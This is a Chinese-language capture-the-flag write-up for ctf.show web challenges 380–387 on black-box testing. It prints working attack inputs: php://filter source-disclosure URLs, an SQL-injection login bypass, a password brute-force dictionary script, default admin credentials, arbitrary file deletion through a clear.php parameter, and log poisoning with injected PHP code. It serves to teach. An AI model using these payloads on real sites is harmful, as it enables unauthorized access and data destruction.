## web380

查看网页源代码

![1621326870805](黑盒测试.assets/1621326870805.png)

能看到一个page_3.php的注释，看了一圈没看到什么东西，索性直接访问page.php

![1621326975701](黑盒测试.assets/1621326975701.png)

那就直接访问

```
page.php?id=1
```

![1621327092048](黑盒测试.assets/1621327092048.png)

waring弹出，是使用file_get_contents读取文件，我们将1改为index发现直接返回了主页,那我们可以尝试读取有没有flag文件

```
page.php?id=flag
```

![1621327209618](黑盒测试.assets/1621327209618.png)



```
file_get_contents

(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)

file_get_contents — 将整个文件读入一个字符串

```

因为使用了file_get_contents，所以我们可以使用php伪协议来读取代码

```
page.php?id=php://filter/convert.base64-encode/resource=index
```

![1621327525371](黑盒测试.assets/1621327525371.png)

同样也可以读取flag文件

```
page.php?id=php://filter/convert.base64-encode/resource=flag
```

## web381

​	查看源代码，按照上一题的方法发现做不出，但是发现了一个alsckdfy经过测试是后台的地址。

![1621344438813](黑盒测试.assets/1621344438813.png)

```
/alsckdfy/(这里注意路由的写法)
```

题目的本意也是让我们找到后台的地址(这才是黑盒测试的本质)

![1621344556409](黑盒测试.assets/1621344556409.png)

## web382

后台弱口令，登录获得flag

```
admin 'or '1'='1
密码随意
```

## web383

解题思路与382一样

## web384

![1621344878096](黑盒测试.assets/1621344878096.png)

题目提示前三位是小写字母，后三位是数字，所以题目的本意就是让我们爆破密码呗

后序一定补！

```python
length = 5
charLength = 2
char = 'abcdefghijklmnopqrstuvwxyz'

def formatNum(n):
    global length
    return '0'*(length-charLength-len(str(abs(n))))+str(abs(n))[:length-charLength]

string = ''
for n in char:
    for c in char:
        for i in range(pow(10,length-charLength)):
            string += n+c+formatNum(i)+'\n'

with open('dict.txt','w') as f:
    f.write(string)

```

burp跑一下字典得到密码为xy123

## web385

访问

```
http://e9bdf733-b2a1-4b5f-bfe0-df3cf7798266.challenge.ctf.show:8080/install/
```

![1621758916507](黑盒测试.assets/1621758916507.png)

根据提示

```
http://e9bdf733-b2a1-4b5f-bfe0-df3cf7798266.challenge.ctf.show:8080/install/?install
```

![1621758945702](黑盒测试.assets/1621758945702.png)

在访问后台登录页面,用原密码 admin admin888

登录获得flag

## web386

按照上一题，接着访问install

![1621759156810](黑盒测试.assets/1621759156810.png)

提示lock.dat存在无法重复安装，所以我们要尝试将lock.dat删除掉

经过扫描发现了存在一个clear.php,那肯定是用这个clear.php来删除文件，盲猜一波file参数

```
http://ed902854-7a20-47d6-b1bd-589fee68e5df.challenge.ctf.show:8080/clear.php?file=/var/www/html/install/lock.dat
```

![1621759732372](黑盒测试.assets/1621759732372.png)

接着就到了上一题的步骤

登录即可

## web387

开局给了一个提示

![1621759888539](黑盒测试.assets/1621759888539.png)

经过尝试发现不可以。

访问一下robots.txt,发现/debug

![1621761187107](黑盒测试.assets/1621761187107.png)

访问一下

![1621762937418](黑盒测试.assets/1621762937418.png)

提示file not exist,那直接file一个文件

![1621763000402](黑盒测试.assets/1621763000402.png)

那肯定也可以包含日志文件，尝试传入一句话失败了，原因是没有接受Post的值，也就是说他可以执行传入的东西，只是不接受，那直接传入php的代码将lock.dat删掉

```php
<?php unlink('/var/www/html/install/lock.dat')?>
```



![1621762722074](黑盒测试.assets/1621762722074.png)

包含以下日志文件让他执行

![1621762731781](黑盒测试.assets/1621762731781.png)

然后访问install发现执行成功

![1621762746787](黑盒测试.assets/1621762746787.png)

登陆获得flag











